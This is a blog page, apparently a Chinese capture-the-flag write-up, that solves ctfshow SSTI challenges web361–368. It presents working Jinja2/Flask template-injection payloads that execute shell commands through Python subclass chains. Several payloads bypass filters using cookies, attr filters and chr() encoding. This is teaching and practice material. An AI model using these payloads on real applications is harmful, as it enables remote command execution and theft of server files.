@@ -1,0 +1,287 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow-SSTI篇 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="web361
+提示名字就是考点， 界面有hello，想到通过name传参，进行尝试：
+
+123name=&amp;#123;&amp;#123;hello&amp;#125;&amp;#125;name=&amp;#123;&amp;#123;1,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow-SSTI篇</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow-SSTI篇</h1>
+        <div class="stuff">
+            <span>八月 28, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ssti/" rel="tag">ssti</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><ul>
+<li>提示名字就是考点， 界面有hello，想到通过name传参，进行尝试：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;hello&#125;&#125;</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;<span class="number">1</span>*<span class="number">2</span>&#125;&#125;   返回<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>确定为模板注入。</p>
+<ul>
+<li><p>对于ssti类的题目，自己写一个字典，将payload中常见的符号和基类写进去，进行fuzz测试。</p>
+</li>
+<li><p>简单fuzz一下，发现没有过滤。</p>
+</li>
+<li><p>查看当前可以使用的类：</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>通过对应类下的函数执行命令：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>读取ls /   网站根目录 发现flag</li>
+</ul>
+<p>将命令换成cat /flag即可。</p>
+<h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><p>使用一样的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><ul>
+<li>简单fuzz了一下，发现过滤了<strong>单引号、双引号</strong>，<strong>使用request进行get传参</strong>：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:</span></span><br><span class="line">name=&#123;&#123;x.__init__.__globals__[request.args.x1].<span class="built_in">eval</span>(request.args.x2)&#125;&#125;&amp;x1=__builtins__&amp;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">x可以使用原来的<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>]，也可以使用任意字母,执行结果都是一样的。(已在题目中进行尝试)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><ul>
+<li>fuzz一下，发现<strong>过滤了单引号双引号和args</strong>，不能使用get方式进行传参。post请求方式无法使用，<strong>尝试使用cookies</strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload1:</span></span><br><span class="line">&#123;&#123;x.__init__.__globals__.__builtins__[request.cookies.x1](request.cookies.x2).read()&#125;&#125;</span><br><span class="line">cookies：x1=<span class="built_in">open</span>;x2=/flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2:</span></span><br><span class="line">&#123;&#123;x.__init__.__globals__[request.cookies.x1].<span class="built_in">eval</span>(request.cookies.x2)&#125;&#125;</span><br><span class="line">cookies：x1=__builtins__;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line"><span class="comment">#两种方式都可以</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:</span></span><br><span class="line">&#123;&#123;x.__init__.__globals__[request.cookies.x1].<span class="built_in">eval</span>(request.cookies.x2)&#125;&#125;</span><br><span class="line"></span><br><span class="line">cookies：x1=__builtins__;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web366-、web267"><a href="#web366-、web267" class="headerlink" title="web366 、web267"></a>web366 、web267</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了中括号 下划线 单引号 双引号  <span class="built_in">globals</span>、getitem  args</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>使用flask过滤器</strong></li>
+</ul>
+<p>flask过滤器的用法可以参考官方文档：</p>
+<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/">https://jinja.palletsprojects.com/en/3.0.x/templates/</a></p>
+<p>或者yu师傅的博客：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:</span></span><br><span class="line">name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="built_in">eval</span>(request.cookies.x5)&#125;&#125;</span><br><span class="line"></span><br><span class="line">cookie传值</span><br><span class="line">Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h3><ul>
+<li><p>在上一题的基础上，将<strong>双花括号</strong>也过滤掉了</p>
+</li>
+<li><p>payload:</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用&#123;% %&#125;绕过</span></span><br><span class="line">name=&#123;%<span class="built_in">print</span>((x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="built_in">eval</span>(request.cookies.x5))%&#125;</span><br><span class="line"></span><br><span class="line">Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"> <span class="comment">#使用chr绕过</span></span><br><span class="line">&#123;%%20<span class="built_in">set</span>%20<span class="built_in">chr</span>%<span class="number">20</span>=%<span class="number">20</span>().__class__.__base__.__subclasses__().pop(<span class="number">433</span>).__init__.__globals__.__builtins__.<span class="built_in">chr</span>%<span class="number">20</span>%&#125;&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">132</span>).__init__.__globals__.popen(<span class="built_in">chr</span>(<span class="number">99</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">116</span>)%2bchr(<span class="number">32</span>)%2bchr(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web361"><span class="toc-number">1.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web362"><span class="toc-number">2.</span> <span class="toc-text">web362</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web363"><span class="toc-number">3.</span> <span class="toc-text">web363</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web364"><span class="toc-number">4.</span> <span class="toc-text">web364</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web365"><span class="toc-number">5.</span> <span class="toc-text">web365</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web366-%E3%80%81web267"><span class="toc-number">6.</span> <span class="toc-text">web366 、web267</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web368"><span class="toc-number">7.</span> <span class="toc-text">web368</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
